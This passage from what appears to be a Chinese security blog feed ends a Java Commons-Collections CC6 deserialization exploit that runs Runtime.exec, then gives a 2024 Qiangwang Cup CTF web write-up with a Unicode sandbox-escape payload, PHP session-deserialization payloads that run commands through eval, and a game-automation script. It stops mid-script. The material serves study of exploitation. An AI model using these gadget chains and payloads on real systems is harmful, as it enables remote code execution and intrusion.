java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryExp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] tansformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(tansformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        fieldfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldfactory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633821.png" alt="image-20250116161141359"></p><p>解释一下为什么会有<code>map.remove(&quot;aaa&quot;)</code></p><p>在<code>LazyMap</code>的<code>get</code>方法下个断点，</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633335.png" alt="image-20250116160658857" style="zoom:67%;"><p>这里会判断<code>LazyMap</code>中有没有<code>key</code>，本来是没有的，但是<code>put</code>了一个键值对，如果这里不删除就会导致进不去if，自然也就无法调用<code>factory.transform(key)</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633358.png" alt="image-20250116160943653"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></div><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501161633476.png" alt="image-20250116162730701" style="zoom:67%;"><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://gtl-ju.github.io/2023/07/26/cc6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">cc6利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.nbcares.top/archives/CC6">Java_Commons-Collections 6 (CC6)学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">Java反序列化Commons-Collections篇03-CC6链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024 第八届强网杯线上赛Web Writeup</title>
    <link href="http://example.com/2024/11/04/2024-%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BWeb-Writeup/"/>
    <id>http://example.com/2024/11/04/2024-%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BWeb-Writeup/</id>
    <published>2024-11-04T02:38:00.000Z</published>
    <updated>2025-02-02T15:41:43.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>python沙箱逃逸，关键是过滤了很多符号，但是使用了unicode.unicode，可以把unicode字符转换成最相似的ASCII字符，使用中文符号绕过即可</p><p>先来查看根目录</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘；＿＿import＿＿（”builtins”）。len＝lambda p：0；’‘；＿＿import＿＿（”os”）。system（”ls －al ／”）；’</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038455.png" alt="image-20241103223850756"></p><p>发现flag只有root用户可以读取，那我们可以使用dd if直接读取flag文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘；＿＿import＿＿（”builtins”）。len＝lambda p：0；’‘；＿＿import＿＿（”os”）。system（”dd if＝／flag”）；’</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038610.png" alt="image-20241103223754194"></p><h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><p>扫一下后台得到<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>看了一下class.php里面的内容，猜测是一个session反序列化逃逸。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038518.png" alt="image-20241103173222772"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038892.png" alt="image-20241103173032283"></p><p>在本地搭建一个环境看一下。</p><p>随便注册一个用户登陆进去之后，会生成一个sess_xxxxx的文件 并且这个key是随机的，我们并不能确定。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038248.png" alt="image-20241103173430392"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038988.png" alt="image-20241103173952232"></p><p>我们需要利用这个去执行命令，先生成一个phpinfo的内容。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">notouchitsclass</span>(<span class="string">&#x27;phpinfo();&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038815.png" alt="image-20241103174039696"></p><p>然后将password那地方给替换掉。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038811.png" alt="image-20241103174105394"></p><p>刷新可以看到执行了phpinfo,那么思路猜测的是正确的，我们需要去进行逃逸，将session_key和password都吃掉，生成一个新的我们构造的password.</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038910.png" alt="image-20241103174233912"></p><p>命令执行我们用echo &#96;&#96;</p><p>username我们传入 execexecexecexecexecexecexecexecexecexecexecexecexecexecexecexecexec</p><p>password我们传入</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;password|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:12:&quot;echo `ls /`;&quot;;&#125;</span><br></pre></td></tr></table></figure></div><p>因为这个key我们无法预测，可以bp一直跑。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038876.png" alt="image-20241103180526528"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038826.png" alt="image-20241103180536998"></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;password|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:23:&quot;echo `ls /;./readflag`;&quot;;&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038906.png" alt="image-20241103180816818"></p><p>​       </p><h1 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h1><p>扫描admin的二级目录</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411032258233.png" alt="image-20241102235056505"></p><p>访问&#x2F;admin&#x2F;authors</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411032258218.png" alt="image-20241102235224844"></p><p>然后修改管理员密码</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411032258221.png" alt="image-20241102235157267"></p><p>47bb1842b6</p><p>登录后支付设置直接写入命令</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411032258222.png" alt="image-20241102235404492"></p><p>访问拿到flag</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411041038362.png" alt="image-20241102235439049"></p><p>​           </p><h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>进去之后输入username,然后是一个贪吃蛇的，速度挺快的，扫目录也没得到啥，应该是要到达一定的分数，把game.js给ai拷打一下。</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202411032300731.png" alt="image-20241103213845717"></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> heappop, heappush</span><br><span class="line"></span><br><span class="line">current_direction = <span class="string">&quot;RIGHT&quot;</span></span><br><span class="line">last_direction = <span class="string">&quot;RIGHT&quot;</span></span><br><span class="line"></span><br><span class="line">direction_map = &#123;</span><br><span class="line">    <span class="string">&quot;UP&quot;</span>: <span class="string">&quot;DOWN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DOWN&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LEFT&quot;</span>: <span class="string">&quot;RIGHT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RIGHT&quot;</span>: <span class="string">&quot;LEFT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heuristic</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - b[<span class="number">0</span>]) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - b[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_star_search</span>(<span class="params">start, goal, grid_size, snake</span>):</span><br><span class="line">    open_set = []</span><br><span class="line">    heappush(open_set, (<span class="number">0</span>, start))</span><br><span class="line">    came_from = &#123;&#125;</span><br><span class="line">    g_score = &#123;start: <span class="number">0</span>&#125;</span><br><span class="line">    f_score = &#123;start: heuristic(start, goal)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> open_set:</span><br><span class="line">        _, current = heappop(open_set)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current == goal:</span><br><span class="line">            path = []</span><br><span class="line">            <span class="keyword">while</span> current <span class="keyword">in</span> came_from:</span><br><span class="line">                path.append(current)</span><br><span class="line">                current = came_from[current]</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dx, dy <span class="keyword">in</span> [(<span class="number">0</span>, -<span class="number">1</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">0</span>)]:</span><br><span class="line">            neighbor = (current[<span class="number">0</span>] + dx, current[<span class="number">1</span>] + dy)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= neighbor[<span class="number">0</span>] &lt; grid_size <span class="keyword">and</span> <span class="number">0</span> &lt;= neighbor[<span class="number">1</span>] &lt; grid_size <span class="keyword">and</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                tentative_g_score = g_score[current] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> g_score <span class="keyword">or</span> tentative_g_score &lt; g_score[neighbor]:</span><br><span class="line">                    came_from[neighbor] = current</span><br><span class="line">                    g_score[neighbor] = tentative_g_score</span><br><span class="line">                    f_score[neighbor] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class="line">                    heappush(open_set, (f_score[neighbor], neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_direction</span>(<span class="params">snake, food, grid_size</span>):</span><br><span class="line">    <span class="keyword">global</span> current_direction, last_direction</span><br><span class="line"></span><br><span class="line">    head_x, head_y = snake[<span class="number">0</span>][<span class="string">&#x27;x&#x27;</span>], snake[<span class="number">0</span>][<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">    food_x, food_y = food[<span class="number">0</span>], food[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    path = a_star_search((head_x, head_y), (food_x, food_y), grid_size, [(seg[<span class="string">&#x27;x&#x27;</span>], seg[<span class="string">&#x27;y&#x27;</span>]) <span class="keyword">for</span> seg <span class="keyword">in</span> snake])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        next_x, next_y = path[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> next_x &gt; head_x:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;RIGHT&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> next_x &lt; head_x:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;LEFT&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> next_y &gt; head_y:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;DOWN&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> next_y &lt; head_y:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;UP&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        possible_directions = [<span class="string">&quot;UP&quot;</span>, <span class="string">&quot;DOWN&quot;</span>, <span class="string">&quot;LEFT&quot;</span>, <span class="string">&quot;RIGHT&quot;</span>]</span><br><span class="line">        possible_directions.remove(direction_map[current_direction])</span><br><span class="line">        <span class="keyword">return</span> possible_directions[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeg9nmyrzhwzgcfhwik.cloudeci1.ichunqiu.com:5000/move&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zeg9nmyrzhwzgcfhwik.cloudeci1.ichunqiu.com:5000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zeg9nmyrzhwzgcfhwik.cloudeci1.ichunqiu.com:5000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=eyJ1c2VybmFtZSI6IjEifQ.ZydYYQ.y4ThT_rofnb2wUqbhAdL-57DLLU&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=4&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> current_direction, last_direction </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=json.dumps(&#123;<span class="string">&quot;direction&quot;</span>: current_direction&#125;), proxies=proxies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                game_data = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;status&#x27;</span> <span class="keyword">in</span> game_data:</span><br><span class="line">                    <span class="keyword">if</span> game_data[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;game_over&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Game Over!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Final Score:&quot;</span>, game_data.get(<span class="string">&#x27;score&#x27;</span>, <span class="string">&#x27;Score not provided&#x27;</span>))</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> game_data[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;win&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You win!&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Final Score:&quot;</span>, game_data.get(<span class="string">&#x27;score&#x27;</span>, <span class="string">&#x27;Score not provided&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                score = game_data.get(<span class="string">&#x27;score&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span> score &gt;= <span class="number">50</span>:</span><br><span class="line">                    burp_url = <span class="string">&quot;http://127.0.0.1:8080/some_endpoint&quot;</span>  </span><br><span class="line">                    burp_response = requests.post(burp_url, json=game_data)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Data sent to Burp:&quot;</span>, burp_response.status_code)</span><br><span class="line"></span><br><span class="line">                food = game_data.get(<span class="string">&#x27;food&#x27;</span>, [])</span><br><span class="line">                snake = [&#123;<span class="string">&#x27;x&#x27;</span>: segment[<span class="number">0</span>], <span class="string">&#x27;y&#x27;</span>: segment[<span class="number">1</span>]&#125; <span class="keyword">for</span> segment <span class="keyword">in</span> game_data.get(<span class="string">&#x27;snake&#x27;</span>, [])]</span><br><span class="line">                grid_size = game_data.get(<span class="string">&#x27;grid_size&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Food:&quot;</span>, food)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Snake:&quot;</span>, snake)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Current Score:&quot;</span>, score)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> food <span class="keyword">and</span> snake:</span><br><span class="line">                    next_direction = get_next_direction(snake, food, grid_size)</span><br><span class="line">                    current_direction = next_direction</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Request failed with status code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>, response.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Request error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Response Body:&quot;</span>, response.text <span class="keyword">if</span> <span class="string">&#x27;response&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>() <span class="keyword">else</span> <span 